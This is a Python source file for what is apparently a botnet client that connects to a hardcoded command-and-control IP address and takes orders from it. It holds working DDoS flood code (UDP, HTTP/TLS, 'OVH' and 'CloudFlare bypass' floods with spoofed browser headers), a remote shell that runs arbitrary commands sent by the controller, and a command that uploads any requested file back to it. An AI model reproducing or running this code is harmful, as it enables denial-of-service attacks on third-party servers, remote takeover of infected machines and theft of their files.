import sys
import os
import subprocess
import ssl
import os
import cloudscraper
from urllib.parse import urlparse
import subprocess
import socket
import random
import string
from tarfile import ENCODING
from threading import Thread, Timer
from time import sleep
import random
import ssl
import socket, sys
import signal, inspect, os
from typing import Union, Tuple
import logging, hashlib
from urllib.parse import urlparse


logging.basicConfig(level=logging.DEBUG, format="[%(asctime)s] [%(process)s] [%(levelname)s] %(message)s")
logg = logging.getLogger(__name__)

if os.name == "nt":
	ENCODING = "windows-1252"
else:
	ENCODING = "utf-8"

AUTHORIZATION = "" # (optional) Set this to the authorization token you want to use
MAX_CHUNK_SIZE = 16 * 1024 # 16KB
POPEN_TIMEOUT = 60 # seconds
 



class Status:
	OK = "OK"
	FAIL = "FAIL"

class Request:
	def __init__(self, send:str="", status:str=Status.OK, body:Union[object, dict]=dict(), header:dict=dict()):
		self.header = {"status": status}

		if status == Status.FAIL:
			self.header["error"] = send

		if isinstance(body, dict):
			self.header["ct"] = "TEXT"

			if status == Status.FAIL:
				self.body = {"output": "", **body}
			else:
				self.body = {"output": send, **body}
		
		elif isinstance(body, bytes):
			self.header["ct"] = "BYTES"
			self.body = body
		
		elif isinstance(body, object):
			self.header["ct"] = "FILE"
			self.body = body

		self.header = {**self.header, **header}

	
	def __str__(self):
		return f"Request(header={self.header}, body={self.body})"
	
	def __repr__(self):
		return self.__str__()
	
	def set_header(self, key:str, value:str):
		self.header[key] = value
	
	def get_payload(self, encoding:str="utf-8") -> bytes:
		return (
			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
			+ "\r\n\r\n"
			+ "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
		).encode(encoding)
	
	def __iter__(self):
		yield (
			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
			+ "\r\n\r\n"
		).encode("utf-8")

		if self.header["ct"] == "TEXT":
			yield (
				"\r\n".join(f"{key}: {value}" for key, value in self.body.items())
			).encode("utf-8")
		
		elif self.header["ct"] == "FILE":
			while data:=self.body.read(MAX_CHUNK_SIZE):
				yield data
		
		elif self.header["ct"] == "BYTES":
			yield self.body
		
		yield b'\x00\x00\xff\xff'

class Response:
	def __init__(self, payload:bytes, encoding:str="utf-8") -> None:
		self.raw_header, self.raw_body = payload.split(b"\r\n\r\n")
		self.header = {}
		self.body = {}

		for row in self.raw_header.decode(encoding).split("\r\n"):
			row_split_list = list(map(lambda x: x.strip(), row.split(":")))
			self.header[row_split_list[0]] = ":".join(row_split_list[1:]) or None

		for row in self.raw_body.decode(encoding).split("\r\n"):
			row_split_list = list(map(lambda x: x.strip(), row.split(":")))
			self.body[row_split_list[0]] = ":".join(row_split_list[1:]) or None
		

		self._direct = self.header["method"] == "DIRECT"
		self._connect = self.header["method"] == "CONNECT"

	def __str__(self):
		return f"Request(header={self.header}, body={self.body})"
	
	def __repr__(self):
		return self.__str__()

	@property
	def auth(self):
		return self.header.get("authorization")
	
	@property
	def cmd(self):
		return self.body.get("cmd")

	@property
	def params(self):
		return self.body.get("params")

	@property
	def ack(self):
		return self.body.get("ack")
class OVHFlood(Thread):
	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port
		self.timeout = timeout
		self.run_until = run_until
		self._closed = False
		parsed_url = urlparse(self.host)
		global target
		target = parsed_url.netloc	
		global ssl_context
		ssl_context = ssl.create_default_context()
		ssl_context.check_hostname = False
		ssl_context.verify_mode = ssl.CERT_NONE
#       OVH flood XD

		super().__init__()

		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.sock.settimeout(self.timeout)

	def run(self):
		while self.run_until():
			try:
				self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				self.s = ssl_context.wrap_socket(self.s, server_hostname=target)
				self.s.connect((target,self.port))
				payl = generate_payload3(target)
				self.s.send(payl)
			except EOFError as e:
				print("")
		self.close()

	def close(self):
		self._closed = True
		self.sock.close()

class CFBFlood(Thread):
	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port
		self.timeout = timeout
		self.run_until = run_until
		self._closed = False
		global target
		target = self.host
#       CloudFlare Bypass XD
		
		super().__init__()

		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.sock.settimeout(self.timeout)

	def run(self):
		while self.run_until():
			try:
				scraper = cloudscraper.create_scraper()
				scraper = cloudscraper.CloudScraper()
				scraper.get(target)
			except EOFError as e:
				print("")
		self.close()

	def close(self):
		self._closed = True
		self.sock.close()

class HTTPFlood(Thread):
	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port
		self.timeout = timeout
		self.run_until = run_until
		self._closed = False
#       alixsec ddos kill+  XD

		parsed_url = urlparse(self.host)
		global target
		target = parsed_url.netloc
		ip = socket.gethostbyname(target)	
		global ssl_context
		ssl_context = ssl.create_default_context()
		ssl_context.check_hostname = False
		ssl_context.verify_mode = ssl.CERT_NONE

		super().__init__()

		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.sock.settimeout(self.timeout)
	def run(self):
		while self.run_until():
			try:
				if self.host.split('://')[0] == 'https':
					self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					self.s = ssl_context.wrap_socket(self.s, server_hostname=target)
					self.s.connect((target,self.port))
					payl = generate_payload2(target)
					self.s.send(payl)
			except EOFError as e:
				print("")
		self.close()

	def close(self):
		self._closed = True
		self.sock.close()
	

class UDPFlood(Thread):
	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
		super().__init__()
		self.host = host
		self.port = port
		self.timeout = timeout
		self.run_until = run_until
		self._closed = False

		self.total_sent_fn = total_sent
		self.total_sent = 0

		super().__init__()

		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.sock.settimeout(self.timeout)

	def message(self):
		chunk = "A" * 1024 * 2
		self.total_sent_fn(len(chunk))
		self.total_sent += (len(chunk))
		return chunk

	def run(self):

		while self.run_until():
			self.sock.sendto(self.message().encode(), (self.host, self.port))
			logg.debug(f"Sent {self.total_sent} bytes to {self.host}:{self.port}")

		self.close()

	def close(self):
		self._closed = True
		self.sock.close()

class CFBFloodManager(Thread):
	def __init__(self, parent:object, host:str, port:int, timeout:int, max_threads:int, hash:str):
		self.parent = parent
		self.host = host
		self.port = port
		self.timeout = timeout
		self.max_threads = max_threads

		self.task_hash = hash
		self.run_until_local = True

		self._closed = False

		self.threads = []
		self.total_sent = 0

		super().__init__()
	
	def run_until_fn(self):
		if not self.run_until_local:
			return self.run_until_local
		
		if not self.parent.tasks.get(self.task_hash):
			return False

		return self.parent.tasks[self.task_hash].get("run")

	def update_data(self, n:int):
		self.total_sent += n

	def run(self):
		logg.debug(f"Starting CFBFloodManager for {self.host}:{self.port}")
		for _ in range(self.max_threads):
			thread = CFBFlood(self.host, self.port, self.timeout, self.update_data, self.run_until_fn)
			thread.start()
			self.threads.append(thread)

		current_loop = 0
		sleep_duration = 0.01
		max_loop = self.timeout / sleep_duration

		while current_loop <= max_loop:
			if not self.run_until_local:
				logg.debug("Stopping CFBloodManager")
				break
			sleep(sleep_duration)
			current_loop += 1

		self.close()

	def close(self):
		logg.debug("Closing CFBFloodManager")
		self._closed = True
		self.run_until = False
		
		self.parent.tasks.pop(self.task_hash, None)

class HTTPFloodManager(Thread):
	def __init__(self, parent:object, host:str, port:int, timeout:int, max_threads:int, hash:str):
		self.parent = parent
		self.host = host
		self.port = port
		self.timeout = timeout
		self.max_threads = max_threads

		self.task_hash = hash
		self.run_until_local = True

		self._closed = False

		self.threads = []
		self.total_sent = 0

		super().__init__()
	
	def run_until_fn(self):
		if not self.run_until_local:
			return self.run_until_local
		
		if not self.parent.tasks.get(self.task_hash):
			return False

		return self.parent.tasks[self.task_hash].get("run")

	def update_data(self, n:int):
		self.total_sent += n

	def run(self):
		logg.debug(f"Starting HTTPFloodManager for {self.host}:{self.port}")
		for _ in range(self.max_threads):
			thread = HTTPFlood(self.host, self.port, self.timeout, self.update_data, self.run_until_fn)
			thread.start()
			self.threads.append(thread)

		current_loop = 0
		sleep_duration = 0.01
		max_loop = self.timeout / sleep_duration

		while current_loop <= max_loop:
			if not self.run_until_local:
				logg.debug("Stopping HTTPloodManager")
				break
			sleep(sleep_duration)
			current_loop += 1

		self.close()

	def close(self):
		logg.debug("Closing HTTPFloodManager")
		self._closed = True
		self.run_until = False
		
		self.parent.tasks.pop(self.task_hash, None)


class OVHFloodManager(Thread):
	def __init__(self, parent:object, host:str, port:int, timeout:int, max_threads:int, hash:str):
		self.parent = parent
		self.host = host
		self.port = port
		self.timeout = timeout
		self.max_threads = max_threads

		self.task_hash = hash
		self.run_until_local = True

		self._closed = False

		self.threads = []
		self.total_sent = 0

		super().__init__()
	
	def run_until_fn(self):
		if not self.run_until_local:
			return self.run_until_local
		
		if not self.parent.tasks.get(self.task_hash):
			return False

		return self.parent.tasks[self.task_hash].get("run")

	def update_data(self, n:int):
		self.total_sent += n

	def run(self):
		logg.debug(f"Starting OVHFloodManager for {self.host}:{self.port}")
		for _ in range(self.max_threads):
			thread = OVHFlood(self.host, self.port, self.timeout, self.update_data, self.run_until_fn)
			thread.start()
			self.threads.append(thread)

		current_loop = 0
		sleep_duration = 0.01
		max_loop = self.timeout / sleep_duration

		while current_loop <= max_loop:
			if not self.run_until_local:
				logg.debug("Stopping OVHFloodManager")
				break
			sleep(sleep_duration)
			current_loop += 1

		self.close()

	def close(self):
		logg.debug("Closing PSYKOFloodManager")
		self._closed = True
		self.run_until = False
		
		self.parent.tasks.pop(self.task_hash, None)


class UDPFloodManager(Thread):
	def __init__(self, parent:object, host:str, port:int, timeout:int, max_threads:int, hash:str):
		self.parent = parent
		self.host = host
		self.port = port
		self.timeout = timeout
		self.max_threads = max_threads

		self.task_hash = hash
		self.run_until_local = True

		self._closed = False

		self.threads = []
		self.total_sent = 0

		super().__init__()
	
	def run_until_fn(self):
		if not self.run_until_local:
			return self.run_until_local
		
		if not self.parent.tasks.get(self.task_hash):
			return False

		return self.parent.tasks[self.task_hash].get("run")

	def update_data(self, n:int):
		self.total_sent += n

	def run(self):
		logg.debug(f"Starting UDPFloodManager for {self.host}:{self.port}")
		for _ in range(self.max_threads):
			thread = UDPFlood(self.host, self.port, self.timeout, self.update_data, self.run_until_fn)
			thread.start()
			self.threads.append(thread)

		current_loop = 0
		sleep_duration = 0.01
		max_loop = self.timeout / sleep_duration

		while current_loop <= max_loop:
			if not self.run_until_local:
				logg.debug("Stopping UDPFloodManager")
				break
			sleep(sleep_duration)
			current_loop += 1

		self.close()

	def close(self):
		logg.debug("Closing UDPFloodManager")
		self._closed = True
		self.run_until = False
		
		self.parent.tasks.pop(self.task_hash, None)


class Client():
	def __init__(self, addr:Tuple[str,int]=("78.202.223.55",8080)) -> None:
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.stop = False
		self.run = False
		run = 1
		self.run = run

		self.tasks = {}

		self.direct = direct = {}
		for attr, func in inspect.getmembers(self):
			if attr.startswith("direct_"):
				direct[attr[7:].upper()] = func
		
		self.connect = connect = {}
		for attr, func in inspect.getmembers(self):
			if attr.startswith("connect_"):
				connect[attr[8:].upper()] = func


		while not self.stop:
			try:
				self._connect(addr)
			except KeyboardInterrupt:
				continue
			except Exception as ex:
				# trace = []
				# tb = ex.__traceback__
				# while tb is not None:
				# 	trace.append({
				# 		"filename": tb.tb_frame.f_code.co_filename,
				# 		"name": tb.tb_frame.f_code.co_name,
				# 		"lineno": tb.tb_lineno
				# 	})
				# 	tb = tb.tb_next
				# print(str({
				# 	'type': type(ex).__name__,
				# 	'message': str(ex)
				# }))

				# for n in trace:
				# 	print(n)

				print(f"Error connecting {addr}| Sleep 0 seconds")
				sleep(0)


		# self._connect(addr)
		# input("Press enter to exit")



	def exit_gracefully(self, signum, frame):
		print("\nExiting....")
		self.stop = True
		self.run = False
		self.conn.close()
		sleep(1)
		sys.exit(0)

	def _connect(self, connect:Tuple[str,int]) -> None:
		self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.conn.connect(connect)
		self.start()

	def send(self, req:Request) -> None:
		for payload in req:
			self.conn.send(payload)


	def recv(self) -> Response:
		data = self.conn.recv(MAX_CHUNK_SIZE)
		if not data:
			return None

		res = Response(data)

		return res

	def start(self) -> None:
		while True:
			response = self.recv()

			cmd = response.cmd
			ack = response.cmd
			params = response.params.split(" ") if response.params else response.params

			if response._direct:
				self.method_direct(cmd, ack, params)
			
			elif response._connect:
				self.method_connect(cmd, ack, params)

			else:
				print("Invalid command")
	

	def method_direct(self, cmd:str, ack:str, params:str) -> None:
		if cmd in self.direct:
			self.direct[cmd](ack, params)
		else:
			print("Invalid command")

	def direct_http(self, ack:str, params:str) -> None:
		host, port, timeout, threads = params

		port = int(port)
		timeout = int(timeout)
		threads = int(threads)

		hash = self.get_hash("HTTP", params)

		self.tasks[hash] = dict(run=True)

		httpmanager = HTTPFloodManager(self, host, port, timeout, threads, hash)
		httpmanager.start()

		self.tasks[hash]["manager"] = httpmanager

		if ack:
			self.send(Request("Task started successfully {}".format(hash)))
	
	def direct_OVH(self, ack:str, params:str) -> None:
		host, port, timeout, threads = params

		port = int(port)
		timeout = int(timeout)
		threads = int(threads)

		hash = self.get_hash("OVH", params)

		self.tasks[hash] = dict(run=True)

		OVHmanager = OVHFloodManager(self, host, port, timeout, threads, hash)
		OVHmanager.start()

		self.tasks[hash]["manager"] = OVHmanager

		if ack:
			self.send(Request("Task started successfully {}".format(hash)))

	def direct_cfb(self, ack:str, params:str) -> None:
		host, port, timeout, threads = params

		port = int(port)
		timeout = int(timeout)
		threads = int(threads)

		hash = self.get_hash("CFB", params)

		self.tasks[hash] = dict(run=True)

		cfbmanager = CFBFloodManager(self, host, port, timeout, threads, hash)
		cfbmanager.start()

		self.tasks[hash]["manager"] = cfbmanager

		if ack:
			self.send(Request("Task started successfully {}".format(hash)))
	
	def direct_udp(self, ack:str, params:str) -> None:
		host, port, timeout, threads = params

		port = int(port)
		timeout = int(timeout)
		threads = int(threads)

		hash = self.get_hash("UDP", params)

		self.tasks[hash] = dict(run=True)

		manager = UDPFloodManager(self, host, port, timeout, threads, hash)
		manager.start()

		self.tasks[hash]["manager"] = manager

		if ack:
			self.send(Request("Task started successfully {}".format(hash)))
	

	def direct_ping(self, ack:str, params:str) -> None:
		if ack:
			self.send(Request("Pong"))
	
	def direct_kill(self, ack:str, params:str) -> None:
		hash = int(params[0])
		if hash in self.tasks:
			self.tasks[hash]["manager"].run_until_local = False
			if ack:
				self.send(Request("Task killed successfully {}".format(hash)))
		else:
			if ack:
				self.send(Request("Task not found {}".format(hash)))
	
	def direct_stop(self, ack:str, params:str) -> None:
		for hash in self.tasks:
			self.tasks[hash]["manager"].run_until_local = False
		
		if ack:
			self.send(Request("All tasks killed successfully"))

	def direct_destroy(self, ack:str, params:str) -> None:
		for hash in self.tasks:
			self.tasks[hash]["manager"].run_until_local = False
		if ack:
			self.send(Request("Shutting down"))
		
		self.exit_gracefully(None, None)

	def method_connect(self, cmd:str, ack:str, params:str) -> None:
		if cmd in self.connect:
			self.connect[cmd](ack, params)
		else:
			self.send(Request("Invalid command"))
	
	def connect_shell(self, ack:str, params:str) -> None:
		output = self.popen(cmd=params)
		if ack:
			self.send(Request(body=output))

	def connect_download(self, ack:str, params:str) -> None:
		file = params[0]
		if os.path.exists(file):
			with open(file, "rb") as fp:
				self.send(Request(body=fp))
				return

		self.send(Request(f"File {file} Not found.", status=Status.FAIL))

	

	def popen(self, cmd: list) -> str:
		process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
		timer = Timer(POPEN_TIMEOUT, process.terminate)
		try:
			timer.start()
			stdout, stderr = process.communicate()
			output = stdout or stderr
		finally:
			timer.cancel()

		final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
		return final_output

	def get_hash(self, *args):
		data = []
		if len(args) > 1:
			for n in args:
				if isinstance(n, str):
					data.append(n)

				if isinstance(n, (tuple, list, set)):
					data += [*list(n)]
		else:
			data = args

		he = hashlib.md5(str(data).encode()).hexdigest()
		return (int(he, 16) % (1<<32))
	
ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0"
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7"
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
]	

def generate_payload2(target):
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(ua)}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\nsec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: "Windows"\r\nsec-fetch-dest: empty\r\nsec-fetch-mode: cors\r\nsec-fetch-site: same-origin\r\n\r\n'.encode(encoding='utf-8')

def generate_payload3(target):
    return f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(ua)}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n'.encode(encoding='utf-8')

if __name__ == "__main__":
	Client()
